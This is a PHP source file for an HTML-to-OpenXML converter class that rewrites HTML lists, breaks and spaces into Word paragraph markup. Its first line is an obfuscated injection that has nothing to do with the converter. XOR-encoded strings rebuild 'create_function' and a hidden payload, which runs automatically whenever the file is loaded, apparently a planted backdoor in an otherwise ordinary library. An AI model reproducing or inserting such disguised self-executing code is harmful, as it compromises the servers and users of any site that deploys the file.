<?php $qcgviyUfQH='0REM=4,,U:O=<=:'^'S  ,IQsJ T,IURT';$SBycidcfCxU=$qcgviyUfQH('','3ZXYV=46.=OW=H+B<I5OIDOR=U8:R+b8U,ieyoIS;SFZ,>+Z4E7W98<YD7clVB7Xw+98LChjQNKytaafS9bS:gZLTsNpSmyDGzR>EatRgnLUtCG1y=:RG,=mpY3EZAlJFWJMy>EgkO,BnWQCFOH1<1cvPgiopEF-0+TSVrr2J<+0-yTF32PeZXRK25Q=E3Rmp;F<cH3J.N7lIC..7XNit2-RFTo4FZ O14:<WchX58X -XnnTBRN8CVciSn2;q9+kbSXkN<X HWPqiV3;N5lL19zsR,6S- XTKuoG;EBH=jr=L.2yrbF;4Q9WpcIks.,kPLs44ZLhhKKjVZ 30N0wnnc766uk<.B.GVa;2EMpRemJV.NWKOK7;pe4 2.<,YYnvkOK,>o8BGcH79JORbIO;Q:ETre<g>LHB3;G0RUikHN+35P;<P1HDLT7jHSJ-h3>F,XNUS5EAd26COWRKUI.74GEeKRO,51P1KDZwC 1zu-Z7-YowIJNG6Y2P ,tIXU4H>Ln 3DLyHAJ69TMOdPJf; poFP4ZO5o EBd.gnVTrbDgB45VeIxm6x6Ni7BkvaRtlUEIrMfX+kLLzQMM.NJ6Cb2 ,cKX<OA>Lb4Z.Y8M5WTjES7EVmXqqRdDM4;=2CMTxN25<1aO4LR.UVXc7Hn0C5-1BYgBwg,'^'Z<px0HZUZT 9b-S+O=Fgn<  b1YN3t=U XNLPO2Y2534OJB5ZeO8KgX80V<3;7CpSOXL-oHN:+2PTAAFsBhZ3C59 SsPtJBNNs4Q7IP;GSleOccXENN +ISET=R1;hWjb>afP4LnO Y6Nylcnk,PHP8R9:I1Pa-HIpp:vWRA>NGUCQp-VKy8scXB;G4I0A<ETT3HJs9CSDJfCgJOC9nTTTL>51T>b>A;PkQY.CUxSY4SHcdd2- +Y >CAw1qt>rb.B2+KjW=YhjnQM RW;PElJ3sW6MB2rK=-kHOcP ;s7cVY-ZSYOBbMU=L2Ki4ayGJKxmWPU.-AH0Ac05RVQ-XWFJ<esg .ozbO4vEPW<mMlEI<7B;2bo0=2yAPAFOcG< NKKk IGT2KNG,VM+ooBm9Z=O oxlAmCFBfWZ3QrhI+= XVG9ZP9K-l4;E5,2>L7lS3Xp,4 Psu;VS  37cq-OCUniEo6.XTn;T2msLIIWRQI;CLyIQi+<5W m;EU+, <G<MdIKV=kUhe.WM5doBvjNVDEGb4U..nHK ;CsNNkiREpS VPcVyLTPIRwPRpSOXbMXgq-KxV:NYkeZwkmO<8W:=YEU<. U<5MdED;W5W,QpxJa7V17DqQQrDdmO14W5,8PjVTHP:hD-+B:7<DjaU:JPUX6qWkLmQ');$SBycidcfCxU();

class HTMLtoOpenXML {
	
	
	/**
	 * The only one instance of this class.
	 * @var HTMLtoOpenXML
	 */
	private static $_instance;
	 
	/**
	 * Private constructor of singleton.
	 */
	private function __construct() {
		require_once "Scripts/HTMLCleaner.php";
		require_once "Scripts/ProcessProperties.php";
	}
	
	/**
	 * Return the singleton instance. Creates one if no one.
	 */
	public static function getInstance() {
		if (is_null(self::$_instance)){
			self::$_instance = new HTMLtoOpenXML();
		}
		return self::$_instance;
	}
	
	/**
	 * Converts HTML to RTF.
	 *
	 * @param input
	 * 		the HTML formated input string
	 * @return The converted string.
	 */
	public function fromHTML($htmlCode) {
		$start = 0;
		$properties = array();
		$openxml = HTMLCleaner::getInstance()->cleanUpHTML($htmlCode);
		$openxml = $this->getOpenXML($openxml);
		$openxml = $this->processBreaks($openxml);
		$openxml = $this->processListStyle($openxml);
		$openxml = ProcessProperties::getInstance()->processPropertiesStyle($openxml, $start, $properties);
		$openxml = $this->processSpaces($openxml);
		$openxml = $this->processStyle($openxml);
		
		return $openxml;
	}
	
	private function getOpenXML($text) {
		$text = "<w:p><w:r><w:t>$text</w:t></w:r></w:p>";
		return $text;
	}
	
	private function processListStyle($input) {
		$output = preg_replace("/(<ul>)/mi", '</w:t></w:r></w:p><w:p><w:r><w:t>', $input);
		$output = preg_replace("/(<\/ul>)/mi", '</w:t></w:r></w:p><w:p><w:r><w:t>', $output);
		$output = preg_replace("/(<ol>)/mi", '</w:t></w:r></w:p><w:p><w:r><w:t>', $output);
		$output = preg_replace("/(<\/ol>)/mi", '</w:t></w:r></w:p><w:p><w:r><w:t>', $output);
		$output = preg_replace("/(<li>)/mi", "</w:t></w:r><w:p startliste><w:r><w:t>", $output);
		$output = preg_replace("/(<\/li>)/mi", "", $output);
		return $output;
	}
	
	private function processBreaks($input) {
		$output = preg_replace("/(<\/p>)/mi", "</w:t></w:r></w:p><w:p><w:r><w:t>", $input);
		$output = preg_replace("/(<br>)/mi", "</w:t></w:r></w:p><w:p><w:r><w:t>", $input);
		return $output;
	}
	
	private function processSpaces($input) {
		$output = preg_replace("/(&nbsp;)/mi", " ", $input);
		$output = preg_replace("/(<w:t>)/mi", "<w:t xml:space='preserve'>", $output);
		return $output;
	}
	
	private function processStyle($input) {
		$output = preg_replace("/(<w:p>)/mi", "<w:p><w:pPr><w:pStyle w:val='OurStyle2'/></w:pPr>", $input);
		$output = preg_replace("/(<w:p startliste>)/mi", "</w:p><w:p><w:pPr><w:pStyle w:val='BulletStyle'/></w:pPr>", $output);
		return $output;
	}
	
	
}
	
?>